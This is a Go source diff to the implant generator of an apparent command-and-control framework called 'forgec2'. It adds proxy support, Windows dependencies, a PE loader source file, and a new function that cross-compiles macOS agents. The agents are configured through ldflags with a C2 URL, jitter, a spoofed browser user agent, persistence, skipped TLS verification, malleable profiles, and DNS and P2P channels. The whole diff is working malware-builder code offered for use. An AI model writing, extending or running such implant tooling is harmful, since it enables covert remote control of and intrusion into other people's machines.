@@ -137,6 +137,7 @@ type AgentConfig struct {
 	P2PListenAddr string // parent listen addr (pipe name or tcp addr)
 	DNSDomain     string // DNS C2 domain (e.g. "c2.example.com")
 	DNSServer     string // DNS C2 server IP
+	Proxy         string // HTTP proxy URL (e.g. "http://proxy:8080")
 }
 
 // GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
@@ -183,13 +184,28 @@ func GenerateWindowsEXE(cfg AgentConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
-	// Minimal go.mod for agent (stdlib only)
+	// go.mod with required external dependencies
 	goMod := `module agent
 
 go 1.25
+
+require (
+	github.com/Microsoft/go-winio v0.6.2
+	golang.org/x/sys v0.42.0
+)
 `
 
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
+		return "", err
+	}
+
+	// Also write go.sum entries for the two deps
+	goSum := `github.com/Microsoft/go-winio v0.6.2 h1:F2VQgta7ecxGYO8k3ZZz3RS8fVIXVxONVUPlNERoyfY=
+github.com/Microsoft/go-winio v0.6.2/go.mod h1:yd8OoFMLzJbo9gZq8j5qaps8bJ9aShtEA8Ipt1oGCvU=
+golang.org/x/sys v0.42.0 h1:omrd2nAlyT5ESRdCLYdm3+fMfNFE/+Rf4bDIQImRJeo=
+golang.org/x/sys v0.42.0/go.mod h1:4GL1E5IUh+htKOUEOaiffhrAeqysfVGipDYzABqnCmw=
+`
+	if err := os.WriteFile(filepath.Join(tmpDir, "go.sum"), []byte(goSum), 0644); err != nil {
 		return "", err
 	}
 
@@ -224,7 +240,7 @@ go 1.25
 		p2pListenAddr = cfg.P2PListenAddr
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s"`,
+	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -240,6 +256,7 @@ go 1.25
 		escape(p2pListenAddr),
 		escape(cfg.DNSDomain),
 		escape(cfg.DNSServer),
+		escape(cfg.Proxy),
 	)
 
 	// Output filename
@@ -262,11 +279,21 @@ go 1.25
 		return "", err
 	}
 
-	// Build command - use explicit GOOS/GOARCH
+	// Run go mod tidy to resolve dependencies
 	goCmd, err := getGoCmd()
 	if err != nil {
 		return "", err
 	}
+	tidyCmd := exec.Command(goCmd, "mod", "tidy")
+	tidyCmd.Dir = tmpDir
+	var tidyOut, tidyErr bytes.Buffer
+	tidyCmd.Stdout = &tidyOut
+	tidyCmd.Stderr = &tidyErr
+	if err := tidyCmd.Run(); err != nil {
+		return "", fmt.Errorf("go mod tidy failed: %w\n%s\n%s", err, tidyOut.String(), tidyErr.String())
+	}
+
+	// Build command - use explicit GOOS/GOARCH
 	cmd := exec.Command(goCmd, "build",
 		"-ldflags", ldflags,
 		"-o", outPath,
@@ -373,6 +400,7 @@ func extractAgentSources(efs embed.FS, dir string) error {
 		"agent/agent_windows.go",
 		"agent/agent_linux.go",
 		"agent/bof.go",
+		"agent/peloader.go",
 		"agent/dns.go",
 	}
 	for _, f := range files {
@@ -473,7 +501,7 @@ go 1.25
 		p2pListenAddr = cfg.P2PListenAddr
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s"`,
+	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -489,6 +517,7 @@ go 1.25
 		escape(p2pListenAddr),
 		escape(cfg.DNSDomain),
 		escape(cfg.DNSServer),
+		escape(cfg.Proxy),
 	)
 
 	outName := cfg.Filename
@@ -540,5 +569,154 @@ go 1.25
 	return outPath, nil
 }
 
-// Note: Agents are ONLY produced via the Generate page (EXE + PS1 + Linux ELF).
+// GenerateMacOS builds a macOS agent binary via cross-compilation.
+func GenerateMacOS(cfg AgentConfig, outputDir string) (string, error) {
+	if cfg.C2URL == "" {
+		cfg.C2URL = "http://127.0.0.1:8080"
+	}
+	if cfg.Interval == 0 {
+		cfg.Interval = 10
+	}
+	if cfg.Jitter == 0 {
+		cfg.Jitter = 20
+	}
+	if cfg.UserAgent == "" {
+		cfg.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+	}
+	if cfg.Protocol == "" {
+		cfg.Protocol = "http"
+	}
+
+	profile := loadMalleableProfile(cfg.Profile)
+	if cfg.UserAgent == "" {
+		cfg.UserAgent = profile.UserAgent
+	}
+	if cfg.Interval == 0 && profile.Sleep > 0 {
+		cfg.Interval = profile.Sleep
+	}
+	if cfg.Jitter == 0 && profile.Jitter > 0 {
+		cfg.Jitter = profile.Jitter
+	}
+
+	tmpDir, err := os.MkdirTemp("", "forgec2-agent-macos-*")
+	if err != nil {
+		return "", err
+	}
+	defer os.RemoveAll(tmpDir)
+
+	if !filepath.IsAbs(outputDir) {
+		if abs, err := filepath.Abs(outputDir); err == nil {
+			outputDir = abs
+		}
+	}
+
+	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
+		return "", err
+	}
+
+	goMod := `module agent
+
+go 1.25
+`
+	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
+		return "", err
+	}
+
+	userAgent := cfg.UserAgent
+	persist := "false"
+	if cfg.Persist {
+		persist = "true"
+	}
+	skipTLS := "false"
+	if cfg.SkipTLSVerify {
+		skipTLS = "true"
+	}
+
+	escape := func(s string) string {
+		s = strings.ReplaceAll(s, `\`, `\\`)
+		s = strings.ReplaceAll(s, `"`, `\"`)
+		return s
+	}
+
+	p2pMode := cfg.P2PMode
+	if p2pMode == "" && cfg.Protocol == "p2p" {
+		p2pMode = "tcp"
+	}
+	var p2pParent, p2pListenAddr string
+	if cfg.P2PParent != "" {
+		p2pParent = cfg.P2PParent
+	}
+	if cfg.P2PListenAddr != "" {
+		p2pListenAddr = cfg.P2PListenAddr
+	}
+
+	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s"`,
+		escape(cfg.C2URL),
+		cfg.Interval,
+		cfg.Jitter,
+		escape(userAgent),
+		persist,
+		skipTLS,
+		cfg.Protocol,
+		fmt.Sprintf("%t", cfg.Debug),
+		escape(profile.BeaconURI),
+		profile.Method,
+		escape(p2pMode),
+		escape(p2pParent),
+		escape(p2pListenAddr),
+		escape(cfg.DNSDomain),
+		escape(cfg.DNSServer),
+		escape(cfg.Proxy),
+	)
+
+	outName := cfg.Filename
+	if outName == "" {
+		outName = "forgec2_agent"
+	}
+	// macOS binaries typically have no extension
+	if strings.HasSuffix(strings.ToLower(outName), ".exe") {
+		outName = outName[:len(outName)-4]
+	}
+	outPath := filepath.Join(outputDir, outName)
+	if !filepath.IsAbs(outPath) {
+		if abs, err := filepath.Abs(outPath); err == nil {
+			outPath = abs
+		}
+	}
+	outDir := filepath.Dir(outPath)
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return "", err
+	}
+
+	goCmd, err := getGoCmd()
+	if err != nil {
+		return "", err
+	}
+	cmd := exec.Command(goCmd, "build",
+		"-ldflags", ldflags,
+		"-o", outPath,
+		"-trimpath",
+		".",
+	)
+	cmd.Dir = tmpDir
+	cmd.Env = append(os.Environ(),
+		"GOOS=darwin",
+		"GOARCH=amd64",
+		"CGO_ENABLED=0",
+	)
+
+	var stderr bytes.Buffer
+	cmd.Stderr = &stderr
+	if err := cmd.Run(); err != nil {
+		return "", fmt.Errorf("go build (macos) failed: %w\n%s", err, stderr.String())
+	}
+
+	if _, err := os.Stat(outPath); err != nil {
+		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
+	}
+
+	return outPath, nil
+}
+
+// Note: Agents are ONLY produced via the Generate page (EXE + PS1 + Linux ELF + macOS).
 // The PS1 template lives in powershell_template.ps1 as the canonical implementation.
